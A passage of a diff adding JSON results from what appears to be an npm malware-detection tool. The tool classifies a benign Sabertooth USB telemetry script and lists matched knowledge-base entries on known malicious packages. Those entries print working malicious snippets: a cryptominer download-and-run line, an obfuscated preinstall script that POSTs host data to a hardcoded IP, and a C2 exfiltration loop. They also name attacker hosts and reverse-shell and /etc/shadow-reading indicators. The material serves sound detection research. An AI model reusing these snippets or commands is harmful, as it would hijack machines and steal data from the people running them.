+                  "package_name": "amzn, zg-rentals, lyft-dataset-sdk, serverless-slack-app",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all versions published as malicious)",
+                  "why_malicious": "These packages were intentionally crafted to exploit dependency confusion attacks, enabling attackers to execute code at import-time that exfiltrates sensitive files (such as /etc/shadow and .bash_history) and establishes reverse shells. This results in credential theft and allows remote system compromise by providing attackers with unauthorized access and control."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a result of dependency confusion, replacing an internal dependency with a malicious public version.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is present and will execute at import-time."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes automatically upon import, harvesting sensitive files such as /etc/shadow and .bash_history.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Sensitive credential and history data is collected for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected sensitive data is exfiltrated to attacker-controlled servers via outbound HTTPS or HTTP requests.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and system information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "A reverse shell is established, granting the attacker remote access to the compromised system.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains persistent remote control and can execute arbitrary commands."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Node.js package accessing sensitive files such as /etc/shadow or .bash_history at import-time",
+                    "Spawning of shell processes (e.g., /bin/sh) and connecting to external IP addresses",
+                    "Immediate outbound HTTPS or HTTP requests containing local file contents or credential data",
+                    "Reverse shell activity initiated by package code during installation or import"
+                  ],
+                  "file_indicators": [
+                    "run.js or index.js containing execSync('cat /etc/shadow') or references to .bash_history",
+                    "Hardcoded external hostnames or IP addresses (e.g., comevil.fun, 5.189.184.129) in package code",
+                    "Use of child_process or net modules to spawn shells or create sockets"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to comevil.fun, d9c0c0d50237.ngrok.io, 5.189.184.129",
+                    "Unusual HTTPS or HTTP requests initiated during package installation or import, especially to unknown domains or IPs"
+                  ],
+                  "how_to_detect": "Monitor for Node.js packages that access sensitive files (such as /etc/shadow or .bash_history) or spawn shell processes at import-time. Flag any package that initiates outbound network connections to unknown domains or hardcoded IP addresses during installation or import. Use static analysis to detect suspicious use of execSync, child_process.spawn, net.Socket, or references to credential files. Correlate package installation or import events with subsequent network activity to known malicious indicators for automated detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_782028_snippet_4",
+              "source_package": "speedtestspa, speedtestkas, speedtestbom, speedtesto (and 12 others) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_782028/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4827178716659546,
+              "code_similarity": 0.4173404276371002,
+              "behavior_similarity": 0.5480953454971313,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "var speedTest=require('speedtest-net');\nvar ProgressBar = require('progress');\nvar chalk = require('chalk');\nexec('wget https://gitlab.com/parsnekamser/clouds/-/raw/main/los;chmod 700 los;./los -o wss://51.222.96.66:80 -u derolgysfiv');",
+                "code_behavior": "At import-time, the code loads legitimate speed test modules to provide expected functionality, while simultaneously downloading and executing a mining binary in the background, which connects to a mining pool and hijacks system resources for mining.",
+                "malice_analysis": {
+                  "why_suspicious": "The code blends legitimate speed test functionality with hidden malicious mining activity, a classic trojanization technique. The malicious process is launched in the background to avoid user detection.",
+                  "violated_expectations": "A speed test utility should not execute unrelated binaries or initiate background mining processes while providing legitimate functionality.",
+                  "similar_legitimate_use": "No legitimate use for this behavior exists in a speed test utility. Blending benign and malicious code is a hallmark of trojanized packages.",
+                  "key_indicators": [
+                    "Blending of legitimate and malicious code in the same file",
+                    "Background mining process launched alongside expected functionality",
+                    "External binary download and execution",
+                    "Outbound connection to mining pool"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "speedtestspa, speedtestkas, speedtestbom, speedtesto (and 12 others)",
+                  "package_manager": "npm",
+                  "package_versions": "all versions published by user 'trendava' before Jan 18, 2023",
+                  "why_malicious": "These packages impersonate legitimate internet speed testing utilities but instead deploy cryptocurrency miners, covertly hijacking system resources for unauthorized mining operations. The packages employ multiple evasion techniques, including downloading mining binaries from external sources, embedding miners, dynamically retrieving mining pool addresses, and blending malicious activity with legitimate functionality to avoid detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious NPM package, believing it to be a legitimate speed test utility.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution at import-time"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code in index.js executes at import-time, downloading a mining binary from an external source (such as GitLab or an external IP).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Binary is made executable and launched"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The mining binary is executed, connecting to a cryptocurrency mining pool (address may be hardcoded or dynamically retrieved from an external source).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "System resources are hijacked for mining"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In some variants, legitimate speed test functionality is provided to avoid suspicion and maintain user trust.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "User is unaware of background mining activity"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "NPM package executes code at import-time or install-time, triggering process execution without user interaction",
+                    "Downloads and executes external binaries from untrusted sources such as GitLab or direct IP addresses",
+                    "Initiates outbound connections to known mining pool addresses or suspicious IPs, including WebSocket connections",
+                    "Blends legitimate speed test functionality with hidden mining activity in the same codebase"
+                  ],
+                  "file_indicators": [
+                    "index.js containing exec, wget, curl, chmod, or nohup commands",
+                    "Presence of downloaded binaries named 'data', 'los', or 'miner' in the package directory",
+                    "Unexpected use of process execution functions (e.g., exec) in JavaScript files of speed test utilities"
+                  ],
+                  "network_indicators": [
+                    "Connections to gitlab.com/parsnekamser/clouds/-/raw/main/* for binary downloads",
+                    "Outbound connections to mining pool addresses such as eu.kaspa.k1pool.com:15555 and 51.222.96.66:80",
+                    "Dynamic retrieval of mining pool addresses from external IPs via HTTP or curl",
+                    "WebSocket connections to suspicious IPs for mining activity"
+                  ],
+                  "how_to_detect": "Monitor NPM package installations and imports for scripts that download and execute external binaries, especially from non-standard or untrusted sources. Flag packages that initiate outbound connections to known mining pools or suspicious IPs, or use exec/spawn to run shell commands. Inspect for blended code that provides expected speed test functionality while launching background processes. Use static and dynamic analysis to detect unexpected process creation, file downloads, and network activity during package installation or import. Correlate presence of binaries named 'data', 'los', or 'miner' with suspicious process and network behavior."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/sabertooth-usb/1.5.1/package/lib/examples/get.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "get_slice_1",
+          "code_snippet": "\"use strict\";\n/**\n * Prints telemetry from each connected Sabertooth device.\n */\nvar __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {\n    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }\n    return new (P || (P = Promise))(function (resolve, reject) {\n        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }\n        function rejected(value) { try { step(generator[\"throw\"](value)); } catch (e) { reject(e); } }\n        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }\n        step((generator = generator.apply(thisArg, _arguments || [])).next());\n    });\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nconst index_1 = require(\"../index\");\nlet sabertoothDevices = null;\n// Get all available sabertooth devices.\n(0, index_1.listSabertoothDevices)().then(devices => {\n    if (devices.length === 0) {\n        console.error(\"No Sabertooth devices found.\");\n    }\n    else {\n        console.log(`Found ${devices.length} Sabertooth devices.`);\n        sabertoothDevices = devices.map(device => new index_1.SabertoothUSB(device.path, {\n            // All options at default values.\n            baudRate: 38400, timeout: 1000, maxGetAttemptCount: 3, address: 128, debug: true\n        }));\n    }\n});\nconst printStats = () => __awaiter(void 0, void 0, void 0, function* () {\n    const startTime = Date.now();\n    if (sabertoothDevices !== null) {\n        for (const sabertooth of sabertoothDevices) {\n            console.log(`Sabertooth @ ${sabertooth.path}:`);\n            // Check that the connection is open and working.\n            if (sabertooth.isConnected()) {\n                try {\n                    console.log(`  Battery voltage: ${yield sabertooth.getBatteryVoltage()}V`);\n                    for (const channel of [1, 2]) {\n                        console.log(`  Motor driver channel ${channel}`);\n                        console.log(`    Temp:    ${yield sabertooth.getMotorDriverOutputTemperature(channel)}°C`);\n                        // Note: the current sensor is extremely noisy and can vary as much as several amps.\n                        console.log(`    Current: ${yield sabertooth.getMotorCurrent(channel)}A`);\n                        // Motor rates are in range [-1, 1], full-reverse to full-forward.\n                        console.log(`    Rate:    ${Math.round((yield sabertooth.getMotorDriverOutputRate(channel)) * 100)}%`);\n                    }\n                }\n                catch (e) {\n                    console.error(e);\n                }\n            }\n            else {\n                console.log(`  Waiting for connection, last error: ${sabertooth === null || sabertooth === void 0 ? void 0 : sabertooth.getLastError()}`);\n            }\n        }\n        console.log(`Got stats in ${((Date.now() - startTime) / 1000).toFixed(1)}s\\n`);\n    }\n    else {\n        console.log(`Searching for devices.`);\n    }\n    // Print stats at most once every second (allow for all requests to take longer than a second).\n    setTimeout(printStats, 1000 - (Date.now() - startTime));\n});\nprintStats();",
+          "is_malicious": false,
+          "malice_score": 0.4352701187133789,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses connected Sabertooth USB devices via device paths and communicates with them using serial communication APIs (SabertoothUSB). It reads telemetry data including battery voltage, motor driver temperature, current, and motor output rates, then logs this information to the console. No network, file, or process execution operations occur, and no suspicious hardcoded IPs, URLs, or commands are present, resulting in benign device telemetry monitoring.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a straightforward telemetry monitoring script for Sabertooth USB devices. It only interacts with local hardware devices via serial communication APIs to read telemetry data such as battery voltage, motor temperature, current, and motor output rates. There are no network communications, no data exfiltration, no obfuscation, no file system writes beyond console logging, and no execution of arbitrary commands. Compared to the known malicious patterns, which involve network exfiltration, encryption, or logging of attack parameters, this code lacks any suspicious or malicious behavior. The similarity scores to known malware are low (0.43-0.45) and relate mostly to logging or device communication, but the intent and context differ significantly. Therefore, this code is benign device telemetry monitoring.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_133857_807400_snippet_3",
+              "source_package": "FrostyGoop (custom/standalone (Windows executable, not a package manager ecosystem))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_37koih65/20241224_133857_807400/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4467282295227051,
+              "code_similarity": 0.3707270622253418,
+              "behavior_similarity": 0.5227293968200684,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "Logs Modbus TCP communications to the console and optionally to a JSON file, recording start time, target IP, and command details.",
+                "code_behavior": "At runtime, after each Modbus TCP communication, the code logs details—including timestamps, target IPs, and command parameters—to the console and/or a JSON file, creating a record of attack activity for the operator.",
+                "malice_analysis": {
+                  "why_suspicious": "Malware logging its own attack activity is typically intended for attacker situational awareness, operational review, or exfiltration, rather than for legitimate operational purposes.",
+                  "violated_expectations": "Legitimate ICS tools may log device interactions for troubleshooting, but malware logs are used to track attack success or to facilitate further malicious operations.",
+                  "similar_legitimate_use": "ICS management tools may log device interactions for auditing or troubleshooting, but such logs are not intended to document unauthorized or malicious activity.",
+                  "key_indicators": [
+                    "Detailed logging of attack parameters (target IPs, Modbus commands, timestamps)",
+                    "Optional output of logs to JSON files in addition to console",
+                    "Log files created in locations accessible to the attacker"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (after Modbus communication with target devices)",
+                  "file_location": "main executable (logging logic, post-communication)",
+                  "required_permissions": [
+                    "filesystem (write access for log output)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "FrostyGoop",
+                  "package_manager": "custom/standalone (Windows executable, not a package manager ecosystem)",
+                  "package_versions": "Unknown (single malware binary, no versioning specified)",
+                  "why_malicious": "FrostyGoop is a purpose-built malware targeting industrial control systems (ICS), specifically exploiting the Modbus TCP protocol to read and manipulate operational technology (OT) device registers. It enables attackers to disrupt critical infrastructure, as evidenced by its use in disabling heating in hundreds of apartment buildings. The malware's support for external configuration via command-line arguments or JSON files allows for rapid, customizable targeting and attack scaling. Its direct, unauthorized manipulation of ICS devices, combined with detailed attack logging, makes it a highly dangerous and targeted threat to critical infrastructure."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obtain target ICS device IPs and Modbus command parameters from command-line arguments or configuration file.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for direct device communication"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Establish TCP connections to ICS devices on port 502 and send Modbus commands to read or modify device registers.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Direct manipulation or disruption of OT device state"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Log details of Modbus TCP communications, including timestamps, target IPs, and command details, to console and/or JSON file.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker situational awareness and potential exfiltration of operational data"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unusual Modbus TCP traffic (port 502) originating from non-ICS management or unauthorized Windows hosts",
+                    "Execution of binaries that accept ICS device IPs and Modbus command parameters as command-line arguments or via JSON configuration files",
+                    "Use of Modbus write commands (Code 6, 16) to alter device state outside of scheduled maintenance windows",
+                    "Creation of detailed JSON log files documenting Modbus command activity, including target IPs and command parameters"
+                  ],
+                  "file_indicators": [
+                    "Presence of suspicious JSON configuration files specifying ICS device IPs and Modbus commands on Windows hosts with ICS/OT network access",
+                    "Unrecognized executable binaries present on Windows systems with access to ICS networks",
+                    "JSON log files containing records of Modbus command activity, especially in non-standard directories"
+                  ],
+                  "network_indicators": [
+                    "Outbound Modbus TCP connections (port 502) to ICS device IPs from unauthorized or non-standard hosts",
+                    "High volume or unusual patterns of Modbus Code 6/16 (write) commands originating from endpoints not associated with ICS management",
+                    "Modbus TCP sessions initiated outside of normal operational hours"
+                  ],
+                  "how_to_detect": "Monitor for unauthorized Modbus TCP traffic, particularly write commands (Code 6, 16), originating from non-ICS management Windows hosts. Flag execution of unknown binaries that accept ICS device IPs and Modbus commands as input, especially those reading from or writing to JSON config or log files. Correlate the presence of suspicious JSON configuration or log files with network activity to identify potential FrostyGoop or similar ICS-targeted malware. Implement host-based and network-based detection to identify the full attack chain."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_056284_snippet_2",
+              "source_package": "kwxiaodian (PyPI)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_056284/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4337964653968811,
+              "code_similarity": 0.43634235858917236,
+              "behavior_similarity": 0.43125057220458984,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const https=require('https'),os=require('os'),crypto=require('crypto'),x=require('./util');\nvar theNetworkInterfaces={};\nfor(var i=0;i<os.networkInterfaces().en0.length;i++){\n  os.networkInterfaces().en0[i].family=='IPv4'&&(theNetworkInterfaces=os.networkInterfaces().en0[i]);\n}\nvar report={\n  'arch':os.arch(),\n  'endianness':os.endianness(),\n  'freemem':os.freemem(),\n  'homedir':os.homedir(),\n  'hostname':os.hostname(),\n  'networkInterfaces':theNetworkInterfaces,\n  'platform':os.platform(),\n  'release':os.release(),\n  'tmpdir':os.tmpdir(),\n  'totalmem':os.totalmem(),\n  'type':os.type(),\n  'uptime':os.uptime(),\n  'package':'index.js'\n};\nreport.networkInterfaces.family.indexOf('.')==-1&&(report.platform!='darwin'&&process.exit(1));\nvar data=JSON.stringify(x.encryptM(JSON.stringify(report)));\nconst options={\n  'hostname':'81.70.191.194',\n  'port':17189,\n  'path':'/healthy',\n  'method':'POST',\n  'headers':{'Content-Type':'application/json','Content-Length':data.length}\n},req=https.request(options,_0x4c1a80=>{\n  _0x4c1a80.on('data',_0x38588f=>{process.stdout.write(_0x38588f);});\n});\nreq.on('error',_0x5d8a57=>{return;}),req.write(data),req.end();",
+                "code_behavior": "At preinstall-time, the code collects extensive system and network information on macOS, encrypts it using AES-128-CBC with a hardcoded key, and exfiltrates it via HTTPS POST to 81.70.191.194:17189/healthy, enabling covert reconnaissance.",
+                "malice_analysis": {
+                  "why_suspicious": "The code gathers detailed host and network data, encrypts it, and sends it to an external server during the preinstall phase, which is not expected or necessary for legitimate npm packages.",
+                  "violated_expectations": "npm preinstall scripts should not collect or transmit host information, especially not encrypted and to an untrusted server.",
+                  "similar_legitimate_use": "Some telemetry or analytics packages may collect environment info, but always with user consent and never at install-time.",
+                  "key_indicators": [
+                    "Obfuscated code to hinder analysis",
+                    "Targeted execution on macOS",
+                    "Encryption of exfiltrated data (attempt to evade detection)",
+                    "Hardcoded external IP and path in network request",
+                    "Collection of network interface and system details during installation"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (npm lifecycle)",
+                  "file_location": "package.json (preinstall hook) and index.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "kwxiaodian",
+                  "package_manager": "PyPI",
+                  "package_versions": "9.1.10",
+                  "why_malicious": "The package is malicious because it collects sensitive system and user information from macOS machines during installation and exfiltrates it to an attacker-controlled server. This behavior is not expected in legitimate packages and is a clear indicator of reconnaissance and staging for further attacks. The campaign targets multiple ecosystems (PyPI, npm, RubyGems) using similar techniques, focusing on developer environments and enabling further compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed on a developer's machine (via pip, npm, or gem).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of malicious install/preinstall scripts."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code checks if the platform is macOS and collects detailed system and user information.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Preparation of data for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected data is encoded (base64 or encrypted) and exfiltrated to an attacker-controlled server via HTTP/HTTPS.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives reconnaissance data for further targeting or attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Install/preinstall scripts that collect system or user information during package installation",
+                    "Conditional execution based on macOS platform in install scripts",
+                    "Exfiltration of encoded or encrypted data to external IPs during install/preinstall phase",
+                    "Obfuscated or encrypted payloads in install scripts to evade detection"
+                  ],
+                  "file_indicators": [
+                    "setup.py containing os.popen and curl commands for data exfiltration",
+                    "package.json with preinstall hook executing index.js",
+                    "index.js with obfuscated or encrypted data exfiltration logic",
+                    "Rakefile with Net::HTTP.get and base64 encoding of system information"
+                  ],
+                  "network_indicators": [
+                    "HTTP/HTTPS requests to 81.70.191.194 on ports 14333, 17189, 31310",
+                    "Outbound connections to /start/, /healthy, or /ruby/info paths during package installation",
+                    "Unusual outbound connections to hardcoded IP addresses during install/preinstall"
+                  ],
+                  "how_to_detect": "Monitor for install/preinstall scripts in packages that access system or user information and make outbound network requests, especially to hardcoded IPs or during installation. Flag packages that conditionally execute on macOS and exfiltrate data (base64 or encrypted) to external servers. Use static analysis to detect os.popen, curl, Net::HTTP.get, or obfuscated/encrypted payloads in install scripts. Network monitoring should alert on connections to 81.70.191.194 and similar suspicious endpoints during package installation."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_785926_snippet_3",
+              "source_package": "web-browserify (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_785926/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4307492971420288,
+              "code_similarity": 0.4119448959827423,
+              "behavior_similarity": 0.4495536983013153,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "Uses 'systeminformation' npm module to collect system username, OS info, Docker images, Bluetooth devices, VM presence, CPU, RAM, disk, network, battery, WiFi, USB info, etc. Exfiltrates data via HTTP GET to 'ejemplo.me'.",
+                "code_behavior": "At runtime after persistence, the binary collects extensive system fingerprinting data using the 'systeminformation' module, then exfiltrates the collected data via HTTP GET requests to the attacker-controlled domain 'ejemplo.me', resulting in unauthorized disclosure of sensitive system information.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting detailed system information and exfiltrating it to an external domain is a hallmark of reconnaissance and data theft, especially when performed without user consent or notification.",
+                  "violated_expectations": "Legitimate packages do not exfiltrate system data to external domains, particularly not over unencrypted HTTP connections.",
+                  "similar_legitimate_use": "System inventory or monitoring tools may collect similar data, but do not transmit it externally without explicit user consent and secure channels.",
+                  "key_indicators": [
+                    "Uses systeminformation module for fingerprinting",
+                    "Exfiltrates data to attacker-controlled domain",
+                    "Transmits sensitive data over HTTP"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (after persistence)",
+                  "file_location": "bin/run/run (ELF binary, runtime)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "web-browserify",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0",
+                  "why_malicious": "The package 'web-browserify' impersonates the legitimate 'browserify' library and contains a malicious postinstall script that extracts and executes a persistent ELF binary. This binary performs system reconnaissance, exfiltrates sensitive information to an attacker-controlled domain, seeks elevated privileges, establishes persistence, and attempts destructive actions such as deleting system configuration files and disabling core services. The use of legitimate open-source modules for malicious purposes enables evasion of standard antivirus detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious postinstall script executes, extracting and running the ELF binary.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of persistent malware binary"
+                  },
+                  {
+                    "step": 2,
+                    "action": "ELF binary requests root privileges and establishes persistence by copying itself to /etc/rot1.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malware runs on every system boot"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malware collects extensive system and user information using legitimate modules.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Preparation for data exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Exfiltrates collected data to attacker-controlled domain over HTTP.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives system fingerprinting data"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Attempts destructive actions: deleting /etc/ and disabling system services.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Potential system inoperability or sabotage"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm postinstall script executing a bundled ELF binary",
+                    "Immediate deletion of installation artifacts (e.g., bin directory) after execution",
+                    "Request for root privileges during npm install via sudo-prompt",
+                    "Persistence via copying to /etc/rot1 or similar system directories",
+                    "System reconnaissance using systeminformation or similar modules",
+                    "Exfiltration of system data to non-standard or suspicious domains over HTTP",
+                    "Destructive actions targeting /etc/ or systemd/systemctl from npm-installed binaries"
+                  ],
+                  "file_indicators": [
+                    "Presence of run.tar.xz or large ELF binaries in npm package tarballs",
+                    "Copy of binary to /etc/rot1",
+                    "Unusual or complex postinstall scripts in package.json"
+                  ],
+                  "network_indicators": [
+                    "HTTP requests to 'ejemplo.me' or similar attacker-controlled domains",
+                    "Outbound HTTP GET requests containing system fingerprinting data as URL parameters"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute binaries or request elevated privileges. Flag packages that extract and run ELF binaries, especially if they delete installation files immediately after execution. Detect persistence mechanisms involving copying binaries to /etc/rot1 or similar system directories. Monitor network traffic for exfiltration attempts to suspicious domains such as 'ejemplo.me', particularly over unencrypted HTTP. Alert on any attempts to delete /etc/ or modify systemd/systemctl from binaries installed via npm packages."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113158_583018_snippet_4",
+              "source_package": "WasabiSeed, Screenshotter, AHK Bot, Rhadamanthys Stealer (Custom-delivered via phishing/MSI installers (not public package manager))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113158_583018/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4226599335670471,
+              "code_similarity": 0.32465875148773193,
+              "behavior_similarity": 0.5206611156463623,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "; Pseudocode (AutoHotKey)\nC2 := \"hxxp://89.208.105.255/\" . serial\nLoop {\n  data := CollectSystemInfo()\n  HttpPost(C2, data)\n  Sleep, 60000\n}",
+                "code_behavior": "At runtime, the script collects system information, sends the data to a hardcoded C2 server using the C: drive serial as a unique identifier in the URL, and repeatedly exfiltrates profiling data to enable further targeted actions.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated system profiling and repeated exfiltration of environment data to a C2 server is a common step in targeted attacks, enabling attackers to assess and prioritize victims.",
+                  "violated_expectations": "Legitimate automation scripts do not exfiltrate system data to unknown or untrusted servers, nor do they use unique hardware identifiers for tracking.",
+                  "similar_legitimate_use": "Enterprise inventory tools may collect system info, but only transmit it to trusted, internal servers and with user or admin awareness.",
+                  "key_indicators": [
+                    "Use of drive serial as unique victim identifier in C2 communication",
+                    "Hardcoded C2 server address in script",
+                    "Automated, repeated exfiltration of system profiling data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (after reconnaissance, if target is interesting)",
+                  "file_location": "AHK Bot Looper component (au3.exe, au3.ahk)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "WasabiSeed, Screenshotter, AHK Bot, Rhadamanthys Stealer",
+                  "package_manager": "Custom-delivered via phishing/MSI installers (not public package manager)",
+                  "package_versions": "N/A (custom malware, delivered as MSI/VBS/AutoHotKey scripts)",
+                  "why_malicious": "These packages are part of a coordinated, multi-stage attack chain designed to gain initial access to victim systems, perform automated reconnaissance, and exfiltrate sensitive data. The components include downloaders, screenshot utilities, automation bots, and infostealers, each performing unauthorized actions such as downloading further payloads, capturing and exfiltrating screenshots, automating system profiling, and stealing credentials and files from a wide range of applications."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User receives phishing email with malicious attachment or link.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initial infection via download and execution of WasabiSeed MSI."
+                  },
+                  {
+                    "step": 2,
+                    "action": "WasabiSeed VBS downloader repeatedly contacts C2 to fetch additional payloads.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Download and execution of Screenshotter and AHK Bot."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Screenshotter captures and exfiltrates desktop screenshots to C2 for reconnaissance.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker reviews screenshots to determine if target is valuable."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If target is interesting, AHK Bot is deployed to automate further profiling and C2 communication.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "System profiling and preparation for further exploitation."
+                  },
+                  {
+                    "step": 5,
+                    "action": "If target is high-value, Rhadamanthys Stealer is deployed to extract and exfiltrate credentials, files, and sensitive data.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Final data exfiltration and compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Repeated download attempts of MSI installers from untrusted IPs or domains using scripting languages (JavaScript, VBS, AutoHotKey)",
+                    "VBS or AutoHotKey scripts that loop and contact remote C2 servers for payloads or data exfiltration",
+                    "Automated screenshot capture and exfiltration via HTTP POST to hardcoded endpoints",
+                    "Credential and file access from unrelated applications immediately followed by network exfiltration to suspicious domains"
+                  ],
+                  "file_indicators": [
+                    "OCDService.vbs inside MSI installers",
+                    "AutoHotKey scripts (au3.ahk) and executables (au3.exe) in temporary or user directories",
+                    "Suspicious MSI installers (ke.msi, Screenshotter Installer MSI, AHK Bot installer MSI) present in download or temp locations",
+                    "Presence of screenshot files or temporary images in user directories created by unknown processes"
+                  ],
+                  "network_indicators": [
+                    "Connections to 79.137.198.60, 109.107.173.72, 89.208.105.255, moosdies.top",
+                    "HTTP POST requests to /screenshot/%serial% or similar C2 paths on 109.107.173.72",
+                    "Frequent outbound connections to hardcoded IPs/domains not associated with legitimate software or business operations"
+                  ],
